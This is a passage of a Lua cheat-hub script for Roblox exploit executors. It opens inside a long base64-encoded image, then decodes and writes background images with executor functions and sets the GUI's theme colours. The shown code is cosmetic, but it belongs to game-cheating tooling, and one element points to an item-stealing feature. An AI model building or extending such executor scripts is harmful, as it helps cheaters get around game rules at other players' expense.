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]],
} local BG_RESOLVED = { None = "" } local function b64decode(data) local decoders = { function() return crypt.base64decode(data) end, function() return crypt.base64.decode(data) end, function() return base64_decode(data) end, function() return syn.crypt.base64.decode(data) end, function() local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'; data = data:gsub('[^'..b..'=]','') return (data:gsub('.', function(x) if x=='=' then return '' end local r,f='', (b:find(x)-1) for i=6,1,-1 do r=r..(f%2^i - f%2^(i-1) > 0 and '1' or '0') end return r
end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x) if #x~=8 then return '' end local c=0 for i=1,8 do c=c + (x:sub(i,i)=='1' and 2^(8-i) or 0) end return string.char(c) end)) end, } for _, fn in ipairs(decoders) do local ok, res; do local __m = {pcall(fn)}; ok = __m[1]; res = __m[2]; end if ok and type(res)=='string' and #res > 0 then return res end end return nil end local function ensureBgAssets() local gca = getcustomasset or getsynasset or nil; local wf = writefile or (syn and syn.writefile) or nil if not gca or not wf then return end for name, b64 in pairs(BG_EMBED) do local fileName = "VersincBG_" .. name .. ".jpg"
local okWrite = pcall(function() local bin = b64decode(b64) if not bin then return end wf(fileName, bin) end) if okWrite then local okPath, path; do local __m = {pcall(gca, fileName)}; okPath = __m[1]; path = __m[2]; end if okPath and type(path)=='string' then BG_RESOLVED[name] = path end end end end pcall(ensureBgAssets) local BG_PRESETS = { { name = "Wave Hub", id = "rbxassetid://130935005587354" }, { name = "None",  id = "" }, { name = "Neon",  id = "Neon" }, { name = "Wave",  id = "Wave" }, { name = "Bloom", id = "Bloom" }, { name = "Topo",  id = "Topo" }, { name = "Blood", id = "Blood" }, { name = "Gaze",  id = "Gaze" }, { name = "May 1", id = "rbxassetid://82457207608895" }, { name = "May 2", id = "rbxassetid://86319509375427" }, { name = "May 3", id = "rbxassetid://85428036348598" }, { name = "May 4", id = "rbxassetid://86238578096423" }, } local function resolveBgId(key)
if not key or key == "" or key == "None" then return "" end if type(key)=="string" and (key:find("rbxasset", 1, true) or key:find("rbxthumb", 1, true) or key:find("http", 1, true)) then return key end return BG_RESOLVED[key] or "" end local currentThemeName = "WAVE"; S.currentThemeName = currentThemeName; S.themeColor = Color3.fromRGB(45,130,230); local currentBgId = ""; S.currentBgId = ""; S.bgIntensity = S.bgIntensity or 0.58 local main
local bgAsset, bgVeil, stealBarBgAsset local themeAccentStrokes = {}; local themeAccentFrames = {} local function applyBackground(imageId, skipSave)
currentBgId = imageId or ""; S.currentBgId = currentBgId; local resolved = resolveBgId(currentBgId) if bgAsset then if resolved == "" then bgAsset.Image = "rbxassetid://130935005587354"; bgAsset.ImageTransparency = 0.55 if bgVeil then bgVeil.BackgroundTransparency = 0.45 end else bgAsset.Image = resolved; bgAsset.ImageTransparency = 1 - (S.bgIntensity or 0.58); bgAsset.ImageColor3 = Color3.new(1, 1, 1) if bgVeil then bgVeil.BackgroundTransparency = 0.32 end end bgAsset.ZIndex = 0; bgAsset.Visible = true end if stealBarBgAsset then if resolved == "" then stealBarBgAsset.Image = ""; stealBarBgAsset.ImageTransparency = 1; stealBarBgAsset.Visible = false else stealBarBgAsset.Image = resolved; stealBarBgAsset.ImageTransparency = 1 - (S.bgIntensity or 0.58); stealBarBgAsset.ImageColor3 = Color3.new(1, 1, 1); stealBarBgAsset.Visible = true end end if not skipSave then pcall(function() if F and F.saveConfig then F.saveConfig() end end) end end
_G._VersincApplyBackground = function(imageId, skipSave) applyBackground(imageId, skipSave) end local function applyThemeColor(col, name) if name then currentThemeName = name; S.currentThemeName = name end S.themeColor = col; F.refreshWaveTheme(col); pcall(function() if K7 and K7.updateHeadIndicatorTheme then K7.updateHeadIndicatorTheme() end end) COLORS.bg = Color3.new(col.R*0.07,col.G*0.07,col.B*0.07); COLORS.row = Color3.new(col.R*0.12,col.G*0.12,col.B*0.12); COLORS.row2 = Color3.new(col.R*0.18,col.G*0.18,col.B*0.18); COLORS.white = col; COLORS.textDim = col; COLORS.toggleBg = COLORS.bg; COLORS.off = COLORS.bg; COLORS.knob = col; COLORS.stroke = col COLORS.accent = col; COLORS.on = col; COLORS.accentStrong = col; 